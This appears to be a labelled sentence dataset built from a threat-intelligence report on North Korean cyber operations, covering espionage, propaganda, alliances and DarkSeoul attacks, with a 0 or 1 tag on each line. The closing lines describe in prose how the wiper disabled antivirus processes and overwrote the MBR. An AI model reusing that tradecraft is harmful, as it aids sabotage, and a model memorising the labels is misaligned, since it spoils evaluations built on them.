The businesses include cafes and other non-suspect establishments .	0
The highest concentration of these is in China .	0
Members of this espionage network reportedly '' send more than $ 100 million in cash per year to the regime and provide cover for spies .	0
'' These establishments are also used for money laundering and drug trafficking .	0
The regime is also known to kidnap foreign citizens and use them as instruments for intelligence .	0
Prisoners are first tortured and psychologically conditioned to bend to the regime 's will .	0
They are then used based on their skillset .	0
This may include teaching their language to North Koreans , spreading propaganda in their native language , providing translation services , conducting military training , or other skills the regime deems useful .	0
In July 2014 , Japanese officials agreed to lift some sanctions on North Korea when the regime agreed to investigate the whereabouts of Japanese citizens who were allegedly abducted by North Korean agents decades ago .	0
Sanctions to be lifted include the ban on port calls to Japan by North Korean ships .	0
North Korea has also infiltrated important positions in South Korea for both intelligence and psychological operations purposes .	0
In 2011 , South Korea 's National Intelligence Service reportedly discovered the presence of Communist spies .	0
These spies within their trusted circles had been reporting back to North Korea for almost 10 years .	0
The embedded spies included a Democratic Party representative .	0
According to the agency , the spies were on a mission to infiltrate and influence the Democratic Party and to gather military intelligence .	0
The regime also attempts to infiltrate organizations made up of North Koreans who seek shelter in South Korea , in order to gain intelligence .	0
In the past several years , South Korea has arrested at least 14 defectors who were found to be spies .	0
These intelligence collection and counterintelligence capabilities are an attempt to provide the regime with a strategic asymmetrical advantage .	0
The regime leverages its human and cyber resources around the globe to provide an influx of intelligence , while very little credible intelligence about the regime 's activities and capabilities ever becomes available to the outside world .	0
North Korea continues to be a master of propaganda and deception and leverages the cyber realm for psychological operations .	0
Modern North Korean psychological operations tactics include distribution of propaganda via traditional media outlets , websites , and social media .	0
Many of these psychological operations campaigns are politically focused .	0
According to Dr. Andrei Lankov , the North Korean government has '' very rational and highly successful manipulators who usually get what they want by outsmarting everybody else in the process .	0
'' The regime 's Unit 204 is responsible for cyber-psychological operations .	0
These operations are PSYOP tailored for the cyber arena .	0
In order to be successful , cyber- psychological campaigns require speed , precision , and creativity .	0
These campaigns leverage the phenomenon of viral , unverified news stories that tend to rapidly propagate via social media , mobile text messaging , and other electronic communications .	0
This phenomenon creates an arena for strategic propagation of both fact and fiction for the purposes of sentiment manipulation .	0
Such messages may be used for recruitment , cyber mobilization , and to instill fear in a target population .	0
Cyber-psychological operations may also include mental suggestion using technology as a delivery mechanism for subliminal cues .	0
It is unknown whether North Korea possesses this capability .	0
North Korean citizens have access to state-approved social networks on the Kwangmyong .	0
The regime has a limited overt social media presence on the Internet .	0
Some of the known social media platforms employed by the regime include Twitter , Facebook , and YouTube .	0
The YouTube channel North Korea Today , operated by user rodrigorojo1 , features news clips from North Korea .	0
It is unclear whether this channel is officially sanctioned .	0
The North Korea Today YouTube channel also has corresponding profiles on Twitter and Facebook .	0
The Uriminzokkiri website , known for pushing juche ideology and anti-American and anti-South Korean messages , has accompanying social media profiles on YouTube , Google+ , and Facebook .	0
It also has Twitter profiles in both Korean and English .	0
North Korean propaganda is used for several purposes : to enforce the ideals of allies and sympathizers , to frame North Korea in a favorable light to outsiders , to sensationalize the regime 's perceived self-reliance and military prowess , and to shield its own citizens from the outside world .	0
Juche ideology and indoctrination of the regime's youth ensure support of the local population .	0
North Koreans accept military duty as an honor and strive to excel in their service to the regime .	0
In the spirit of juche , the regime uses disinformation to '' hide lapses or tout accomplishments that may have never been achieved .	0
'' Limiting citizen access to the outside world by instituting the Kwangmyong intranet , North Korea ensures its citizens are not exposed to outside information that is counterproductive to citizen indoctrination or in conflict with juche ideals .	0
North Korea portrays the West , particularly the United States , as an enemy .	0
The regime uses this strategy of shifting the population's negative sentiments toward an external entity to keep its citizens ignorant of North Korea 's own economic hardship , regime brutality , and systemic incompetence .	0
For example , prior to Kim Jong Il 's death in 2011 , North Korean media altered photos of their '' Dear Leader '' to make him appear younger and healthier than he really was .	0
This became obvious when the altered photos were compared to those taken by Western media around the same time .	0
According to Dr. Andrei Lankov , '' North Koreans now have a much better understanding of what is going on in the outside than they did before .	0
This is largely thanks to the spread of DVDs and video content in the country , but also because some of them have been to China and talk about what they have seen…many [ of ] them sincerely believe that the United States remains ready to attack at any moment and that Japan is an incurably aggressive place…nearly all of them swallow the official propaganda myths about the Korean War being started by the 'American Imperialists' who invaded them .	0
Hence , they see the outside world as an inherently dangerous place .	0
'' Some human rights groups seek to reach out to North Korean citizens and break them from this isolation .	0
In August 2014 , the New York-based charity Human Rights Foundation sponsored a hackathon in San Francisco called '' Hack North Korea '' to find new ways to get information in , out , and around North Korea .	0
The event brought together many programmers , human rights campaigners , and defectors .	0
North Korea even uses '' trolling '' as a PSYOP tactic .	0
On the Internet , '' trolls '' are users who post messages that are often crass , controversial , inflammatory , or offensive , in order to evoke a strong reaction or influence a reader 's opinion .	0
Often , the motivation for trolling is simply for the troll 's enjoyment .	0
The rude and offensive trolling tactics are in stark contrast to traditional forms of persuasive rhetoric .	0
However , North Korea reportedly utilizes over 200 military intelligence operatives to troll South Korean message boards and social media pages with pro-North Korean sentiments. < /fn > Matt Rhoades , director of the cyberspace and security program at the Truman National Security Project , said , '' North Korea 's cyber-development is almost just a new harassment mechanism for them , a low-cost , asymmetric method to harass its neighbor in the south… '' Leveraging the cyber and intelligence resources noted above , North Korea 's psychological operations serve an important strategic role .	0
The ability to influence outsiders , while effectively isolating its own population from most outside influence , allows North Korea to remain an enigma .	0
Additionally , in line with its PSYOP tactics , North Korea may strategically take credit for cyber attacks that were , in reality , launched by another entity .	0
Whether the targeted entity blames North Korea for the attacks , or the regime simply takes credit for an attack that has not yet been attributed , several PSYOP goals can come into play .	0
First , to claim credit for an attack amplifies the impact of a show of force , particularly if South Korea is the target .	0
This tactic can be used to stir sentiments in order to provoke a reaction .	0
Second , North Korea may lay claim to responsibility for an attack that exceeds its capabilities in order to seem more technologically advanced and more capable .	0
Third , any success , or the appearance thereof , enforces the juche ideal of regime self-sufficiency .	0
Finally , North Korea may act as a scapegoat and claim credit for a cyber attack of an ally such as China so the attack is not attributed to the real actors .	0
North Korea reportedly has the electronic warfare capabilities to jam GPS and to inject false GPS coordinates .	0
North Korea demonstrated these capabilities in March 2011 by jamming South Korea 's GPS signals during a joint U.S.-South Korea military exercise .	0
North Korea has the capability to create an EMP .	0
An EMP is a sudden , extreme outburst of atmospheric electricity creating an intense magnetic field that can burn out electrical equipment .	0
A report from the U.S. Department of Homeland Security ( DHS ) noted North Korea 's ability to deliver a nuclear warhead as a satellite over the South Pole , effectively creating the burst needed to deliver an EMP targeting the United States .	0
An EMP could effectively disrupt electronic communications including critical infrastructure components such as telecommunications , financial institutions , the energy sector , transportation , food and water delivery , emergency services , and space systems .	0
North Korea reportedly acquired its EMP technology from Russia .	0
North Korea also has a drone program .	0
The regime reportedly acquired its first drones in the late 1980 's or early 1990 's .	0
The regime 's drones are complimentary to its intelligence program and are primarily used for surveillance .	0
In early 2014 a North Korean drone crashed south of the 38th parallel , the line dividing North Korea from the south .	0
While early reports noted that the drones appeared similar to those manufactured by Chinese company Tauyuan Navigation Friend Aviation Technology , the company denied involvement .	0
Stressing the importance of the regime 's electronic warfare capabilities , in 1999 former regime leader Kim Jong Il said '' The basic key to victory in modern warfare is to do well in electronic warfare .	0
'' Since the regime 's advanced technology lags behind that of South Korea and the U.S. , its capability to disrupt the communications of these perceived adversaries is a vital asymmetric capability .	0
North Korea utilizes primary and secondary education and the university system to train its cyber warfare operators .	0
According to reports by defectors , the regime seeks out children who show mathematical talent and sends them through rigorous advanced training .	0
A vintage North Korean animation stresses the importance of mathematics in North Korean education .	0
The short film follows a young boy as he does his geometry homework .	0
The frustrated boy begins to daydream then has visions of going to war with the U.S. and needing geometry to effectively calculate missile trajectory during the battle .	0
Science and technology students are expected to learn foreign languages , which may include Chinese , Japanese , and English.233 Student emails , chats , and web browsing activities are heavily monitored .	0
Around age twelve or thirteen , chosen students are enrolled in accelerated computer courses at First and Second Geumseong Senior-Middle Schools .	0
The successful students are then sent to Kim Il-sung University , Kim Chaek University of Technology , or the Command Automation University , traditionally known as Mirim University .	0
Kim Il-sung University 's computer center was started in 1985 .	0
Its computer courses have a heavy programming element .	0
The university reportedly developed the Intelligent Locker hard disc protection program , Worluf Antivirus , SIMNA ( simulation and system analysis program ) , a war games program , a hepatitis diagnosis and prescription system , and a C++ program development tool called FC 2.0 .	0
Kim Il-sung University also has programs focusing on nuclear research .	0
Kim Chaek University of Technology was established in 1948 .	0
In the late 1990s , it began to restructure its computer-focused courses to reflect more modern technologies .	0
As of 2002 , the university had three colleges focusing on computer science , information science and technology , and machine science .	0
Software developed by the university includes Computer Fax and SGVision , an image-reprocessing program used for steganography .	0
Students and instructors must submit a formal request for permission in order to use the Internet for research .	0
The Command Automation University periodically chooses around 100 students for an intensive five-year course prior to their assignment to serve in cyber intelligence and cyber warfare capacities .	0
Programs at the Command Automation University include command automation , computers , programming , automated reconnaissance , and electronic warfare .	0
Other students attend a two-year accelerated university program , then study abroad in Russia or China before they are assigned to a cyber-operator role .	0
The elite cyber operators are given special incentives .	0
For example , parents of students graduating from the cyber program with top scores are given the opportunity to live in Pyongyang ; and married cyber operators are given housing , a food allowance , and a stipend if operating overseas .	0
Due to the nature of their profession , these cyber elite are some of the only North Koreans allowed to access the outside Internet .	0
While this report focuses on North Korea 's cyber warfare capabilities , these capabilities can not be fully separated from the implications of partnerships with countries known to deal in illegal weapons trade with the regime .	0
Now that cyberspace has become a legitimate arena for warfare , these nations are also potential allies in the cyber realm .	0
For this reason , the regime 's key political and military relationships are explored below .	0
North Korea has a longstanding historical relationship with China .	0
During the Korean War ( 1950- 1953 ) , China allied with North Korea 's Communist forces .	0
China has also provided ongoing political and economic support to the regime 's leadership and is a primary trade partner .	0
North Korea is economically dependent on China .	0
North Korea gets an estimated 90 percent of its energy imports , 80 percent of its consumer goods , and 45 percent of its food supply from China .	0
This relationship is prudent – in the event of a military conflict , China can strategically use North Korea as a buffer zone between itself and South Korea , where many U.S. military personnel are stationed .	0
Chinese aid to North Korea also deters the likelihood that the regime will collapse , resulting in internal destabilization that could catalyze a U.S.-China conflict .	0
North Korea relies heavily on China for technological resources .	0
As noted above , North Korea relies on China 's Unicom for Internet access .	0
Additionally , the regime sends some of its cyber warriors to train in China and stations a portion of its Unit 121 personnel in Shenyang .	0
Some of North Korea 's official websites are hosted in China , and KCC has a branch office there .	0
North Korea also relies on China to provide much of its network hardware , including servers and routers .	0
North Korea has a long history of ties to Russia .	0
The former Soviet Union was the major sponsor of the North Korean state and a major trading partner .	0
Following the dissolution of the Soviet Union , aid to North Korea was halted and trade diminished significantly .	0
This chain of events contributed to North Korea 's eventual economic collapse , as it could not survive without aid .	0
North Korea currently has a collaborative relationship with Russia in the cyber realm .	0
The regime's CSTIA relies on Russia as one of several sources for technical data .	0
North Korea also sends some of its cyber warriors to train in Russia , and the regime reportedly acquired its EMP technology from there .	0
Political ties between Russia and North Korea have become stronger in recent months .	0
In 2014 , potentially as a result of the U.S. response to the Russian-Ukranian conflict , Russia began to strengthen ties with North Korea .	0
Negotiations reportedly included promises of trade and development projects .	0
Narushige Michishita , a North Korea and Asia security expert at Japan's National Graduate Institute for Policy Studies , stated '' By strengthening its relationship with North Korea , Russia is trying to enhance its bargaining position vis-à-vis the United States and Japan .	0
'' Russia also recently forgave most of the regime 's debts .	0
North Korea and Iran have longstanding political and military ties .	0
North Korea supplied Iran with conventional arms during the Iran-Iraq War .	0
Iran and North Korea reportedly collaborate closely in ballistic missile development efforts .	0
In the past , Iran provided the North Korean regime with necessary funds and oil in exchange for missile parts and technology .	0
In 2009 , a North Korean plane transporting 35 tons of weapons and allegedly bound for Iran was seized after making an unscheduled stop in Bangkok , Thailand .	0
That same year , United Arab Emirates seized a ship bound for Iran that was transporting several containers of North Korean weapons , including rocket-propelled grenades and ammunition .	0
Reportedly , the customer was a company affiliated with Iran 's Islamic Revolutionary Guard Corps .	0
North Korea also has cyberwar ties with Iran .	0
In 2012 , North Korea and Iran signed a technology treaty to help combat '' common enemies '' in cyberspace .	0
The treaty included provisions for cooperation in research , student exchanges , and joint laboratories .	0
Joint projects reportedly include IT information sharing , engineering , biotechnology , renewable energy , and sustainability .	0
F-Secure 's Mikko Hypponen stated , '' It 's highly likely that one of the reasons for this co-operation is for them to work together regarding their cyber defence and cyber offense strategies '' .	0
Hypponen cited Flame malware as a possible triggering event for the creation of this treaty .	0
Others also suspect that Iran and North Korea 's mutual interest in development of nuclear weapons and the need to protect refineries against malware such as Stuxnet were driving factors in the establishment of the treaty .	0
U.S. House Foreign Affairs Committee leaders assert that the treaty indicates North Korea and Iran are collaborating on a joint nuclear weapons program .	0
Additionally , North Korea , in conjunction with Iran and Syria , reportedly supports both Hamas and Hezbollah in procuring kinetic weaponry and communications equipment and in establishing operational infrastructure .	0
North Korea has both a cyber relationship and kinetic weapons ties with Syria .	0
KCC reportedly has a branch in Syria .	0
In 2007 , Israel launched an airstrike , destroying a Syrian target that was allegedly a nuclear facility under construction with North Korea 's assistance .	0
U.S. officials noted the facility was modeled on the North Korean nuclear reactor at Yongbyon .	0
The North Korea-Syria relationship becomes more important in the context of both countries ' ties with Iran .	0
As noted above , Iran , North Korea , and Syria jointly provide support to extremist groups Hamas and Hezbollah .	0
Additionally , as we explored in HPSR Security Briefing Episode 11 , Iran and Syria 's military alliances extend to joint SIGINT and cyber operations .	0
North Korea also has an interesting relationship with Cuba – one that includes supplying weapons and apparent attempts to illegally smuggle weapons .	0
In 2013 , a North Korean cargo ship on its return voyage was stopped near the Panama Canal .	0
The ship was carrying surface-to-air missile parts , disguised as containers of sugar .	0
In an attempt to save face , Cuba 's Ministry of Foreign Affairs stated that the cargo included '' 240 metric tons of obsolete defensive weapons -- two anti- aircraft missile complexes Volga and Pechora , nine missiles in parts and spares , two Mig-21 Bis and 15 motors for this type of airplane , all of it manufactured in the mid-20th century -- to be repaired and returned to Cuba .	0
'' Experts said the cargo appeared to include a SNR-75 Fan Song fire-control radar system for an SA-2 missile , a Soviet-era missile system that was also used in Cuba .	0
Following the incident , Fidel Castro credited former North Korean leader Kim Il-Sung for providing Cuba with weapons near the end of the Cold War .	0
Weapons included 100,000 AK rifles and necessary ammunition .	0
While no apparent cyber relationship exists between North Korea and Cuba at this time , their track record for weapons trade means the potential for future collaboration in the cyber realm can not be discounted .	0
 North Korea gains access to 33 South Korean military wireless communication networks  The U.S. State Department is attacked by entities in the East Asia-Pacific region .	0
The attacks coincided with State Department negotiations with North Korea regarding the regime 's nuclear missile tests .	0
( June )  A South Korean military official states North Korea 's Unit 121 has breached South Korean and U.S. military entities .	0
( July )  North Korea states that it is '' fully ready for any form of high-tech war .	0
'' ( June )  DarkSeoul DDoS and disk wiping malware targeting South Korean and U.S. government , media outlet , and financial websites .	0
These attacks also coincided with U.S .	0
Independence Day .	0
( July )  Malware for '' Operation Troy '' was likely planted .	0
It is interesting to note that much of North Korea 's cyber activity follows a distinct pattern .	0
Analysis of North Korean cyber activity gives insight into these patterns and also helps tie together North Korea 's strategic , tactical , and operational capabilities .	0
Strategic capabilities refer to the assets used in support of a long-term , overarching goal .	0
Tactical capabilities refer to the methods and maneuvers actually implemented in pursuit of the strategic goal .	0
Operational capabilities refer to the potential use of these capabilities .	0
In 2004 , in response to the annual U.S. – South Korea joint military exercises , North Korea reportedly gained access to 33 South Korean military wireless communication networks .	0
The next significant cyber attack attributed to North Korea was in June 2006 .	0
The U.S. State Department was attacked by entities in the East Asia-Pacific region .	0
The attacks coincided with State Department negotiations with North Korea regarding the regime 's nuclear missile tests .	0
In July 2006 , North Korea 's Unit 121 reportedly breached South Korean and U.S. military entities .	0
This attack was concurrent with the regime 's test-fire of at least one long-range missile and several medium-range missiles .	0
2007 was politically tumultuous for North Korea .	0
Following multi-national talks , the UN's International Atomic Energy Agency ( IAEA ) ordered the shutdown of the regime 's nuclear facilities in Yongbyon in July .	0
Its nuclear efforts temporarily thwarted , North Korea tested a logic bomb in October 2007 .	0
In April 2009 , North Korea ejected IAEA and U.S. nuclear compliance officials .	0
The regime indicated refusal to comply with any UN agreements regarding nuclear weaponry and announced it would reinstate its nuclear materials production .	0
The next month , North Korea conducted an underground nuclear test and voiced its confidence that the regime was well on its way to producing viable nuclear technology .	0
The UN called an emergency meeting condemning the nuclear weapons test , and South Korea joined the Proliferation Security Initiative ( PSI ) .	0
North Korea issued a statement via KCNA calling South Korea 's involvement in PSI an act of war .	0
In June 2009 , North Korea stated that it was '' fully ready for any form of high-tech war .	0
'' The following month , DDoS and disk wiping malware , later known as DarkSeoul , targeted South Korean and U.S. government entities , media outlets , and financial websites .	0
The attacks coincided with U.S .	0
Independence Day .	0
Other malware used for Operation Troy was also planted .	0
Operation Troy would continue for several years , largely undetected .	0
In early 2011 , political and military tensions were high .	0
In February , James Clapper , United States Director of National Intelligence , testified that North Korea likely had undeclared uranium enrichment facilities as part of its nuclear weapons program .	0
In March 2011 , South Korean media , financial , and critical infrastructure targets suffered a DDoS and disk-wiping malware attack later known as the '' 10 Days of Rain '' .	0
U.S. and South Korean military entities were also targeted by DDoS during this attack .	0
The attack used the DarkSeoul malware .	0
North Korea also disrupted South Korean GPS signals .	0
Additionally , North Korean actors reportedly attempted a DDoS attack against South Korea 's Incheon Airport that same month .	0
These incidents coincided with the annual U.S. – South Korea joint military exercises .	0
The following month , North Korean actors reportedly launched a DDoS attack against South Korea 's Nonghyup bank .	0
In 2012 , an attack on South Korean Newspaper JoongAng Ilbo was attributed to North Korean actors .	0
This attack also coincided with the timing of the annual joint U.S. – South Korea military exercises .	0
In September 2012 , North Korea signed a cyber treaty with Iran , agreeing the two nations would collaborate to combat '' common enemies '' in cyberspace .	0
The week of March 11 , 2013 , the U.S. and South Korea began their annual joint military exercise near the Korean Peninsula .	0
Like clockwork , attacks attributed to North Korea and now known as the March 20 attacks targeted three South Korean media outlets and Shinhan , Nonghyup , and Jeju banks .	0
North Korea also exhibited other hostile activity at that time .	0
North Korea cut communication with Seoul and announced it had scrapped the 1953 armistice between the two Koreas .	0
North Korea 's foreign ministry also issued a statement that it perceived this exercise as a precursor to invasion and that the regime would respond with a '' strong military counteraction '' if the situation escalated .	0
That same week , the North Korean military conducted a drone attack simulation .	0
On March 18 , the Uriminzokkiri YouTube channel posted an anti-U.S. video entitled '' Firestorms Will Rain on the Headquarters of War '' that showed a depiction of the White House in crosshairs , followed by an explosion .	0
In May 2013 , DarkSeoul malware was used to attack several South Korean financial institutions ; and in June , DarkSeoul DDoS attacks were launched against the South Korean government 's DNS server .	1
The latter took place on June 25 , the anniversary of the start of the Korean War .	0
As evidenced above , much of North Korea 's cyber activity coincides with the annual U.S. – South Korea joint military exercises .	0
Attacks not following that pattern were typically in response to political events impacting the regime or correlated with significant dates , such as the anniversary of the start of the Korean War .	0
The regime 's strategic assets and tactical capabilities in the cyber arena seem to have evolved only slightly since 2009 .	0
Most of the attacks attributed to North Korea employ limited tactics , and their operational capability demonstrates an increase in the frequency and volume of attacks but is otherwise unimpressive to date .	0
In June 2014 , the regime demanded cancellation of the annual U.S. - South Korea joint military exercise , attempting to use participation in the upcoming Asian Games as a bargaining chip .	0
The regime 's demands may have had other political motivations , as they preceded the July 2014 meeting between South Korean president Park and Chinese President Xi Jinping .	0
The meeting centered on trade and regional security issues , including the ever-present rhetoric around denuclearization of North Korea .	0
Both leaders were critical of Japan 's recent announcement to soften sanctions on North Korea .	0
As this report headed to press , the annual U.S. – South Korea joint military exercises were underway .	0
The most prominent North Korean threat actor group is the group responsible for the DarkSeoul malware .	0
According to statements from the South Korean government , North Korea 's Lab 110 were the actors behind the DarkSeoul malware .	0
South Korean intelligence reports stated that Lab 110 , which is affiliated with the regime 's defense ministry , was ordered by the North Korean regime to destroy South Korean communications networks .	0
Although the March 20 attacks used DarkSeoul malware , it is interesting to note that two groups , WhoIs Team and New Romantic Cyber Army Team , claimed responsibility for the '' March 20 '' 2013 attacks on South Korean media and financial institutions .	0
Some of the DarkSeoul attacks corresponded with significant dates , such as U.S .	0
Independence Day or the anniversary of the start of the Korean War .	0
DarkSeoul attacks go beyond denial of service and sabotage .	0
As early as 2009 , the group responsible for the Dark Seoul attacks launched '' Operation Troy '' , an espionage campaign targeting the South Korean military .	0
The operation was codenamed '' Troy '' due to the frequent use of the word '' Troy '' in the malware's compile path strings .	0
The malware used in these attacks sought out and exfiltrated data , based on keyword searches .	1
While the malware was clearly intended to search for and exfiltrate certain types of data , its true impact on the targets was never revealed .	1
The March 2011 '' 10 Days of Rain '' DDoS attacks on U.S. and South Korean sites have also been attributed to the actors associated with DarkSeoul .	0
According to Symantec , the politically motivated attacks have required a level of intelligence , coordination , monetary support , and technical sophistication that suggests state sponsorship .	0
This designation means the group can be considered an advanced persistent threat ( APT ) .	0
A March 20 , 2013 attack attributed to the DarkSeoul actors targeted three South Korean media outlets and Shinhan , Nonghyup , and Jeju banks .	0
The impact of the March 20 attacks included disruption of service at financial institutions and data deletion .	1
However , the targeted entities resumed normal operations shortly thereafter .	0
According to South Korean reports , the media outlets targeted corresponded with those listed by the North Korean regime in 2012 as right-wing press that manipulated South Korea 's public opinion .	0
In April 2012 , the regime reportedly listed those entities as attack targets .	0
The malware used in the March 20 , 2013 attacks were wiper malware .	1
The malware attempted to disable AhnLab and Hauri AV antivirus products then proceeded to overwrite the master boot record ( MBR ) .	1
The attack was capable of wiping both Linux and Windows machines .	1
McAfee found that these attacks were the culmination of the malware campaign they dubbed '' Operation Troy '' .	0
A report from IssueMakersLab tied the actors responsible for the March 20 , 2013 attacks to cyber attack activity occurring as early as 2007 .	0
IssueMakersLab found that these actors consistently used the same 16-digit password for file compression , the same stage 1 C2 protocol , the same collection keywords and encryption keys , and the same development path .	1
According to South Korea 's Korea Internet and Security Agency , the North Korean IP address 175.45.178.xx was found scanning South Korean routes the month before the attacks , and the same IP was reportedly logged as accessing one of the targets 13 times .	1
Details of the March 20 attack also suggested possible ties to China .	0
AlienVault suspected the Chinese exploit kit GonDad was used to spread the malware , and the Korean domains serving the malware were registered using a Chinese email address .	1
Additionally , researchers at AhnLab in South Korea noted a Chinese IP address linked to the attacks .	0
While no concrete evidence has been released that indicates Lab 110 was responsible for the DarkSeoul attacks , the responsible group 's targets , TTP , and attack timing demonstrate a strong pro-North Korean sentiment .	0
Known tactics , techniques and procedures Targets WhoIs Team is one of two groups that claimed responsibility for the '' March 20 '' attacks targeting South Korea .	0
A defacement on the LG +U webpage stated that it was '' Hacked by WhoIs Team '' and that the attackers would return .	0
The page featured three skulls .	0
However , no other attacks by WhoIs Team have been observed .	0
Known tactics , techniques , and procedures Targets Associated actors Based on North Korea 's affinity for disinformation and counterintelligence , we must note the distinct possibility that operatives claiming to be WhoIs Team are part of another group and that the defacement was a false flag operation meant to pin blame on RAONASRT .	0
RAONASRT is a South Korean white hat capture the flag ( CTF ) team , whose members also operate under the name '' WhoIs '' .	0
l RAONASRT ( the RaonSecure Advanced Security Research Team ) and its sub-teams WhoIs Team and Cpark Team have participated in and performed well in CTF contests such as the one hosted by DefCon .	0
In 2013 , a member of RAONASRT was invited to Blue House , the residence of the South Korean president , to meet with president Park and discuss the security industry .	0
RAONASRT runs the Secuinside CTF competition .	0
Their parent organization RaonSecure operates a whitehat training program .	0
The group also runs the Korea WhiteHat Contest , which is hosted by South Korea 's Ministry of National Defense and National Intelligence Service and supervised by South Korean Cyber Command .	0
For these reasons , it seems unlikely that the RAONASRT WhoIs Team would maliciously target South Korean entities .	0
IsOne is the group that claimed responsibility for the June 2012 attack on the website of South Korean newspaper JoongAng Ilbo .	0
The attack included an attempt to wipe JoongAng Ilbo 's servers as well as a defacement depicting a laughing cat .	0
Despite efforts to wipe the target 's servers , the target only suffered defacement and temporary downtime .	0
Although the groups have a similar name and both use a cat theme , it is unclear whether a CTF team known as '' The Cat is Number 1 '' and IsOne are the same actors .	0
'' The Cat is Number 1 '' members claim to hail from North Korea , but there is no hard evidence linking team members to the region .	0
Again , it seems that the actors responsible for the attack borrowed the moniker of another group .	0
According to South Korea 's National Police Agency , the attack on JoongAng Ilbo shares characteristics with previous attacks attributed to North Korean actors .	0
An investigation conducted by the agency 's Cyber Terror Response Center found that the actors targeting JoongAng Ilbo used two North Korean servers and 17 servers in 10 other countries .	0
One server maintained a constant connection to an IP address belonging to Joson Telecommunication Company , which is affiliated with North Korea 's Ministry of Posts and Telecommunications .	0
Investigators found that one of the servers used in the attack on JoongAng Ilbo was also used in the March 2011 DDoS attacks on South Korean critical infrastructure sites and the April 2011 attack on Nyongyup Bank .	0
Known tactics , techniques and procedures Targets The Kimsuky malware , which targeted South Korean think tanks , is loosely attributed to an actor referred to as Kimsukyang .	0
Little is known about the actor or group responsible for the malware .	0
However , the following email addresses are associated with the Kimsuky operation : The email address iop110112 @ hotmail.com was registered using the alias '' kimsukyang '' , and rsh1213 @ hotmail.com was registered using the alias '' Kim asdfa '' .	0
Kaspersky found that the Kimsuky operation used 10 IP addresses in two Chinese provinces that border North Korea : Jilin and Liaoning .	0
Known tactics , techniques and procedures Targets The New Romantic Cyber Army Team also took credit for the March 20 , 2013 attacks .	0
McAfee suspected New Romantic Cyber Army Team were responsible for Operation Troy and the resulting March 20 , 2013 attacks due to the group 's '' frequent use of Roman and classical terms in their code .	0
'' It is unknown whether Hastati is an alternate name for the group or whether Hastati is an individual actor within the group .	0
It is interesting to note that the malware associated with these actors uses the strings '' HASTATI '' and '' PRINCIPES '' to overwrite the MBR .	0
The name Hastati likely refers to a class of infantrymen of the early Roman Republic .	0
The Hastati were less experienced soldiers who fought on the frontlines with spears and swords .	0
Principes likely refers to more experienced Roman soldiers who fought on the second line of battle .	0
Known tactics , techniques and procedures Targets HP researchers had previously analyzed samples of the DarkSeoul dropper , and findings were published in our annual HP Cyber Risk Report 2013 .	0
Analysis of this malware is included in Appendix C. Analysis of additional malware used in these campaigns produced no new findings and only corroborated what was found by external security researchers .	0
These publicly available analyses have been cited throughout the report .	0
Some of the malware samples were no longer publicly available .	0
However , CrowdStrike obtained these missing samples before they disappeared from the wild and conducted thorough analysis , which was released in their subscription-only reports .	0
While we can not divulge detailed information from those reports , an overview of the findings is provided below .	0
The majority of the malware used in cyber incidents attributed to North Korea were variations of three types of malware : dropper , wiper , and IRC remote access trojan ( RAT ) .	0
CrowdStrike's attribution of this malware to North Korean actors stemmed from two primary factors : Korean language characters found in the binaries and the propensity to specifically target South Korean entities .	0
Dropper samples consistently targeted AhnLab Policy Center as a propagation method .	0
This information is corroborated in a Black Hat Asia 2014 presentation by Fortinet researcher Kyle Yang .	0
CrowdStrike 's report also briefly noted the use of an update server vector .	0
Yang analyzed the malware 's update config metadata and matched its format to the AhnLab Policy Center .	0
To test its payload , Yang set up a server/client and executed the update through the server .	0
As Yang had predicted , it wiped the client .	0
While the method for initial compromise of the update server is not noted in detail , CrowdStrike 's report cites '' collateral information '' that suggests targeted email attacks were used to gain initial entry , and policy servers were then compromised .	1
The upload server vector included a time-based logic bomb that allowed the wiper to target a large number of systems , on a set time and date , with full permissions on all of the targeted systems .	1
According to CrowdStrike , the wiper malware was dropped on the systems as AgentBase.exe .	1
The wiper used the Windows utility 'taskkill ' to kill the processes pasvc.exe and clisvc.exe , which are the main processes for the Ahnlab and Hauri antivirus applications .	1
The wiper then performed system reconnaissance , gathering drive information and operating system version .	1
Depending on the OS used , the wiper recursively deleted files on the file system , deleting the Windows folder last .	1
It then overwrote the MBR with the strings '' HASTATI '' , '' PRINCPES '' , '' PRINCIPES '' , or '' PR ! NCPES '' .	1
While there are several variants of the wiper , all seem to have been used on the same date .	0
It is unclear why multiple wiper variants with slightly differing behavior were used for the same campaign .	0
One possible explanation is that multiple variants were used to minimize the operational damage to the mission in the case of an early detection of one of the variants .	0
For example , if one wiper variant was compromised or detected by antivirus or IDS signatures , the other variants may have differed enough to remain undetected , still resulting in mission success .	0
According to CrowdStrike , a third malware component downloaded an IRC RAT from various compromised websites .	1
This RAT is detected by Symantec as Backdoor.Prioxer .	1
Prioxer has been linked to other 2011 attacks on South Korea .	0
It is unclear whether these downloaders were pushed out in the same update server vector as the wipers .	0
However , the two malware types both use the same packer 'Jokra ' and both contain the strings '' HASTATI '' and '' PRINCPES '' .	0
Based on the information above , we have identified strategic challenges that impact the development of North Korea 's cyber warfare capabilities .	0
We have also noted relevant implications : • The North Korean regime strictly controls all Internet infrastructure , meaning cyber activity by dissidents or autonomous hacker groups are very unlikely .	0
In other words , any cyber attacks originating in North Korea can be assumed to be state sponsored .	0
For this reason , according to defectors , the regime 's cyber operators do not typically launch attacks directly from within North Korea .	0
Instead , many regime-sponsored attacks are launched from cells based in China , U.S. , South Asia , Europe , and even South Korea .	0
• North Korea has a limited number of outgoing connections .	0
For this reason , there is a low probability of DDoS originating from within .	0
However , this does not preclude the use of botnets with a local C2 server or the use of networks in third-party nations to launch attacks .	0
As seen in the July 2009 attacks on South Korean and U.S. targets , North Korea has leveraged networks in countries such as Austria , Georgia , Germany , and even South Korea and the U.S. , in order to launch cyber attacks .	0
North Korea will likely be forced to rely on third parties for quite some time , due to its lack of sufficient infrastructure for launching large-scale CNO .	0
• Several outward facing websites are hosted in China and other countries .	0
This implies two possibilities : that North Korea 's infrastructure can not handle a heavy incoming traffic load or that the regime wants to separate the propaganda crafted for an outside target audience from internally-focused propaganda .	0
This arrangement seems unlikely to change in the foreseeable future .	0
• North Korea is known to have unstable power supplies , which limits scalability of the regime 's current CNO capabilities .	0
This is another reason why expansion of CNO capabilities using the nation 's own infrastructure seems unlikely in the foreseeable future .	0
• North Korea is known to have monetary deficiencies , which further limit expansion of infrastructure and CNO capabilities , at least without third-party aid .	0
North Korea continues to rely heavily on China for sustainment .	0
• Although we see few instances of overt cyber operations , that North Korea reportedly spends so much of its limited resources on training and equipping cyber operators speaks volumes .	0
The human element of the regime 's cyber war program , at least , has potential .	0
